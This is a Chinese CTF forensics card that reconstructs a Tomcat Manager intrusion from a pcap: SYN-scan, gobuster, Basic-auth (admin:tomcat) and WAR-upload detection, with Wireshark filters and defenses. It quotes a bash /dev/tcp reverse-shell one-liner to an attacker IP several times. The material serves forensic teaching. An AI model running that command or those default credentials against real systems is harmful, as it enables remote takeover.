---
id: ctf-forensics-tomcat-manager-pcap-scan-basic-war-reverse-shell
title: Tomcat 管理面板入侵 pcap 还原：nmap SYN 扫描 → gobuster → /admin Basic 认证 → WAR 上传 → 反弹 shell/计划任务
type: scenario
domain: ctf
path: ctf/forensics
technique: tomcat-manager-pcap-scan-basic-war-reverse-shell
tags:
- ctf
- forensics
- pcap
- tomcat
- wireshark
- nmap
- gobuster
- basic-auth
- war
- reverse-shell
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V547
  verified_at: '2026-11-11T20:59:43+08:00'
  notes: '已对照原文 content.md 与 31/31 张截图（重点 29-31）核对：pcap 中 14.0.0.120→10.0.0.112 大量 SYN-only 包（nmap）、GET /admin Host 10.0.0.112:8080 + User-Agent gobuster/3.6、Authorization: Basic YWRtaW46dG9tY2F0→admin:tomcat（200 成功）、唯一 POST 上传 JXQOZY.war、反弹 /bin/bash -c ''bash -i >& /dev/tcp/14.0.0.120/443 0>&1''、问题 7 提示计划任务信息，均与原文/截图一致；IP 反查广州亦与原文一致。dedup 候选为 Tomcat 攻击手法卡、WAR 映射卡及其他 Tomcat 专题卡，非同一 pcap 取证链；dup-scan 无涉及 pair。CTF 流量题无组件 affected_versions。未实际跑 pcap。'
url: /docs/ctf/forensics/ctf-forensics-tomcat-manager-pcap-scan-basic-war-reverse-shell/
draft: false
kb_aliases:
- Tomcat 流量分析
- pcap 应急响应
- Basic Authorization 解码
- WAR 上传流量
- gobuster UA 识别
- nmap SYN 扫描识别
---

## 一句话结论

一段 Tomcat 被入侵的 pcap 可按固定顺序还原：先用大量只有 SYN、没有正常三次握手的包识别 nmap 扫描源；再看 HTTP 请求的 User-Agent 识别 gobuster 目录爆破与 `/admin` 管理面板（8080）；随后过滤 `Authorization: Basic` 并解码 base64 得到弱口令（`admin:tomcat`，返回 200 才是成功）；再找唯一 POST 上传的 WAR（`JXQOZY.war`）；最后在对应 TCP 流中提取反弹 shell 命令与计划任务持久化信息。

## 原理

- **nmap SYN 扫描**：半开扫描向大量端口/主机发送 SYN，不完成三次握手（收到 RST 或直接忽略），pcap 中表现为同一源 IP 对多目标、多端口的 SYN 包，缺少对应的 SYN-ACK→ACK 或 ESTABLISHED；据此可把扫描源从正常业务流量中分离出来。
- **gobuster 目录爆破**：请求 `User-Agent` 常为 `gobuster/3.6`，路径多为字典词（`/admin`、`/manager` 等），Host 带管理端口（`:8080`）。
- **Basic 认证**：HTTP 头 `Authorization: Basic <base64>`，base64 解码即 `用户名:口令`；401 为失败，200 为认证成功，只有成功请求才对应可用凭据。
- **WAR 上传**：Tomcat Manager 通过 POST（multipart）上传 WAR 部署应用；pcap 中通常只有一个这样的 POST，文件名（如 `JXQOZY.war`）即恶意应用名；随后访问对应 context 触发 JSP/Filter 等 payload。
- **反弹 shell 与持久化**：WAR/JSP 执行 `/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'`；攻击者常用计划任务（cron）或服务维持访问，流量中可看到写入计划任务/下载脚本的命令。
- **补充画像**：对攻击者 IP 做归属地/城市反查（如 `14.0.0.120` → 广州），可补齐题目要求的 OSINT 信息。
- **为什么可行**：Tomcat Manager 默认走 HTTP Basic 且常暴露在 8080；弱口令 + WAR 部署是经典 getshell 链，pcap 完整记录了扫描、爆破、认证、上传与命令执行各阶段。

## 触发条件

- 有完整或部分 pcap，HTTP 未加密或已解密（TLS 私钥/会话密钥可得）。
- Wireshark/tshark 可用，能按显示过滤器聚合 TCP/HTTP 流。
- 攻击链经过 Tomcat Manager（8080/manager/html 或 /admin 别名），且使用 Basic 认证与 WAR 上传。
- 反弹 shell 与持久化命令在捕获窗口内出现。

## 利用步骤

1. **识别扫描源**：过滤器 `tcp.flags.syn==1 && tcp.flags.ack==0`，按 `ip.src` 聚合，找对多端口/多主机发 SYN 的 IP（注意排除正常 SYN 重传）。
2. **识别目录爆破**：过滤 HTTP 请求，查看 `User-Agent` 是否含 `gobuster`、`dirb`、`feroxbuster` 等；统计 404/200 路径。
3. **定位管理面板**：看 Host/端口（`:8080`）与路径 `/admin`、`/manager/html`，确认 Tomcat Manager。
4. **解 Basic 认证**：`http contains "Authorization: Basic"`，对每条的 base64 解码，结合响应码找出返回 200 的成功凭据（示例 `YWRtaW46dG9tY2F0` → `admin:tomcat`）。
5. **找 WAR 上传**：`http.request.method==POST`，在 multipart 请求中找 `.war` 文件名（示例 `JXQOZY.war`）。
6. **提取命令与持久化**：Follow TCP Stream 找反弹 shell（`/dev/tcp/<ip>/<port>`）、下载脚本、crontab/计划任务写入命令。
7. **画像补充**：对攻击者 IP 做归属地反查，记录城市/国家等。

## PoC

无 PoC。本文是流量分析题解，示例 pcap 中可解出 `admin:tomcat`、上传 `JXQOZY.war`、执行 `/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`；本文档环境未实际跑 pcap。

## 变体与关联

- **与攻击手法卡互补**：`[[web-java-component-tomcat-manager-basic-weak-auth-war-deploy]]` 讲 Tomcat Manager 弱口令 + WAR 部署 getshell 的攻击步骤，本卡是 pcap 取证与溯源视角。
- **其他流量分析卡**：`[[ctf-forensics-http-unauth-api-audit]]` 等 HTTP 流量审计卡可复用过滤思路；AntSword/哥斯拉流量卡可对照 WebShell 阶段的请求特征。
- **持久化侧**：计划任务反弹 shell 的检测可对照 `[[pentest-persistence-linux-cron-reverse-shell]]`（如库内已有）与挖矿/入侵应急卡。

## 检测与防御

- **检测**：监控 8080/manager 与 `/admin` 的访问；统计 Basic 认证 401/200 频率，弱口令爆破告警；WAR 上传审计（multipart + `.war`）；流量中检测 `/dev/tcp/` 反弹 shell 与计划任务写入。
- **防御**：Tomcat Manager 限制来源 IP、强口令、禁用默认账号；关闭不必要的 8080 与 manager/status 应用；对上传 WAR 做签名/白名单校验；主机侧监控 crontab/服务变更与异常出站连接。
